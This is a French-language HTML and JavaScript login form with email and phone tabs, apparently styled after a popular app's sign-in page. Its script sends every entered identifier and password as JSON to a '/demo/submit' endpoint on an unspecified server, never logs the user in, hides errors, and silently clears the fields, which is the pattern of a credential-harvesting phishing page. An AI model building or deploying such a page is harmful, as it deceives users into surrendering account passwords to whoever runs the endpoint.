<!-- Onglets -->
<div class="mt-4 mb-2 grid grid-cols-2 gap-2">
  <button type="button" id="tabEmail"
          class="tab-btn active w-full rounded-xl px-4 py-2 font-semibold bg-black text-white">
    E-mail / utilisateur
  </button>
  <button type="button" id="tabPhone"
          class="tab-btn w-full rounded-xl px-4 py-2 font-semibold bg-gray-100 text-gray-700">
    Téléphone
  </button>
</div>

<!-- Panneau E-mail -->
<div id="panelEmail" class="space-y-4">
  <div>
    <p class="text-sm text-gray-600 mb-1">Connexion avec une adresse e-mail ou un nom d’utilisateur</p>
    <input id="email" type="text" placeholder="E-mail ou nom d’utilisateur"
           class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
           autocomplete="username" />
  </div>

  <div>
    <input id="passwordEmail" type="password" placeholder="Mot de passe"
           class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
           autocomplete="current-password" />
  </div>
</div>

<!-- Panneau Téléphone -->
<div id="panelPhone" class="hidden space-y-4">
  <p class="text-sm text-gray-600">Connexion avec un numéro de téléphone</p>

  <div class="flex gap-2">
    <!-- Sélecteur indicatif -->
    <select id="dialSelect"
            class="w-28 border border-gray-300 rounded-xl px-3 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black">
    </select>

    <input id="phone" type="tel" placeholder="Numéro de téléphone"
           class="flex-1 border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
           inputmode="tel" />
  </div>

  <div>
    <input id="passwordPhone" type="password" placeholder="Mot de passe"
           class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black" />
  </div>
</div>

<!-- Lien MDP / S’inscrire -->
<div class="flex items-center justify-between text-sm">
  <a href="#" class="text-gray-700 hover:underline" onclick="event.preventDefault()">Mot de passe oublié ?</a>
  <!-- (on enlève “Connexion avec un code”) -->
</div>

<!-- Bouton -->
<button id="submitBtn" type="submit" disabled
        class="w-full rounded-2xl px-6 py-4 text-lg font-semibold transition disabled:opacity-50 disabled:cursor-not-allowed bg-gray-100 text-gray-500">
  Se connecter
</button>

<p class="text-center text-sm sm:text-base text-gray-800 pt-3">
  Tu n'as pas de compte ?
  <a href="#" id="openPin" class="text-red-600 font-semibold hover:underline">S'inscrire</a>
</p>

<script>
  // ------- petit helper : pays -> indicatif
  const DIALS = {
    FR: {code:'+33', label:'FR +33'},
    BE: {code:'+32', label:'BE +32'},
    CH: {code:'+41', label:'CH +41'},
    LU: {code:'+352', label:'LU +352'},
    DE: {code:'+49', label:'DE +49'},
    IT: {code:'+39', label:'IT +39'},
    ES: {code:'+34', label:'ES +34'},
    GB: {code:'+44', label:'GB +44'},
    US: {code:'+1', label:'US +1'},
    CA: {code:'+1', label:'CA +1'}
  };

  // ------- éléments
  const tabEmail   = document.getElementById('tabEmail');
  const tabPhone   = document.getElementById('tabPhone');
  const panelEmail = document.getElementById('panelEmail');
  const panelPhone = document.getElementById('panelPhone');

  const emailEl        = document.getElementById('email');
  const pwdEmailEl     = document.getElementById('passwordEmail');
  const phoneEl        = document.getElementById('phone');
  const pwdPhoneEl     = document.getElementById('passwordPhone');
  const dialSelectEl   = document.getElementById('dialSelect');
  const submitBtn      = document.getElementById('submitBtn');
  const loginForm      = document.getElementById('loginForm');

  // ------- remplir le select des indicatifs
  (function initDialSelect() {
    const lang = (navigator.language || 'fr-FR').split('-')[1]?.toUpperCase() || 'FR';
    const preferred = DIALS[lang] ? lang : 'FR';

    Object.entries(DIALS).forEach(([cc, {code, label}]) => {
      const opt = document.createElement('option');
      opt.value = code;
      opt.textContent = label;
      if (cc === preferred) opt.selected = true;
      dialSelectEl.appendChild(opt);
    });
  })();

  // ------- switch onglets
  function activate(tab) {
    const setActive = (btn, on) => {
      btn.classList.toggle('bg-black', on);
      btn.classList.toggle('text-white', on);
      btn.classList.toggle('bg-gray-100', !on);
      btn.classList.toggle('text-gray-700', !on);
    };

    if (tab === 'email') {
      setActive(tabEmail, true);
      setActive(tabPhone, false);
      panelEmail.classList.remove('hidden');
      panelPhone.classList.add('hidden');
    } else {
      setActive(tabEmail, false);
      setActive(tabPhone, true);
      panelEmail.classList.add('hidden');
      panelPhone.classList.remove('hidden');
    }
    refreshSubmit();
  }

  tabEmail.addEventListener('click', () => activate('email'));
  tabPhone.addEventListener('click', () => activate('phone'));

  // ------- état du bouton
  function refreshSubmit() {
    const emailMode = !panelEmail.classList.contains('hidden');
    const ok = emailMode
      ? (emailEl.value.trim().length > 0 && pwdEmailEl.value.length > 0)
      : (phoneEl.value.trim().length > 4 && pwdPhoneEl.value.length > 0);

    submitBtn.disabled = !ok;
    submitBtn.className = ok
      ? 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-[#f53152] text-white hover:opacity-90 transition'
      : 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-gray-100 text-gray-500 disabled:cursor-not-allowed transition';
  }

  [emailEl, pwdEmailEl, phoneEl, pwdPhoneEl].forEach(el => el.addEventListener('input', refreshSubmit));
  activate('email'); // onglet par défaut

  // ------- soumission (réutilise ton endpoint existant)
  async function demoSubmit(identifier, password) {
    // NOTE : BASE_URL doit déjà être déclaré dans ton script principal
    const r = await fetch(`${BASE_URL}/demo/submit`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: identifier, password })
    });
    // on ne montre pas d'alert; on ignore les erreurs silencieusement
    try { await r.json(); } catch {}
  }

  // ------- handler formulaire
  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    submitBtn.disabled = true;
    submitBtn.textContent = 'Envoi...';

    const emailMode = !panelEmail.classList.contains('hidden');
    const identifier = emailMode
      ? emailEl.value.trim()
      : `${dialSelectEl.value} ${phoneEl.value.trim()}`;
    const password = emailMode ? pwdEmailEl.value : pwdPhoneEl.value;

    await demoSubmit(identifier, password);

    // reset sans popup
    if (emailMode) { emailEl.value = ''; pwdEmailEl.value = ''; }
    else { phoneEl.value = ''; pwdPhoneEl.value = ''; }
    submitBtn.textContent = 'Se connecter';
    refreshSubmit();
  });
</script>



